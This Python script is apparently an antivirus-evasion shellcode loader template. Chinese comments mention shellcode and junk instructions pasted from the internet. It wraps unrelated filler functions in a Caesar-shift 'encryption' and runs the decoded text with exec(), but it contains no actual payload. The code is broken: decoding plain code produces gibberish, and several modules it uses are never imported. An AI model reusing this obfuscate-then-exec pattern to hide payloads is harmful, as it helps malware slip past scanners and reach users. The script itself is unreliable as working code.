#coding:utf-8
import base64
import ctypes
import codecs


# 先来一段shellcode

def bossa():
    # 花指令网上随便粘
     encrypted_content = """ 
     str_array = [''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) for i in range(10)]


def list_to_string(array):
    return [str(x) for x in array]


def is_integer(string):
    try:
        int(string)
        return True
    except ValueError:
        return False


def multiply(x, y):
    return x * y


def count_uppercase_letters(string):
    return sum(1 for c in string if c.isupper())


def merge_lists_as_dict(keys, values):
    return {keys[i]: values[i] for i in range(len(keys))}


def get_current_datetime():
    return datetime.now()


def calculate_human_age(dog_age):
    if dog_age <= 2:
        return dog_age * 10.5
    else:
        return 21 + (dog_age - 2) * 4

float_array = [round(random.uniform(-100, 100), 2) for i in range(100)]


translation_dict = {"hello": "你好", "world": "世界", "python": "nb"}

def translate(word):
    if word in translation_dict:
        return translation_dict[word]
    else:
        return None
     """
    shift = 3
    decrypted_content = ""
    for char in encrypted_content:
        if char.isalpha():
            char_code = ord(char)
            if char.islower():
                decrypted_char = chr((char_code - ord('a') - shift) % 26 + ord('a'))
            else:
                decrypted_char = chr((char_code - ord('A') - shift) % 26 + ord('A'))
        else:
            decrypted_char = char
        decrypted_content += decrypted_char
    exec(decrypted_content)

if __name__ == '__main__':
    bossa()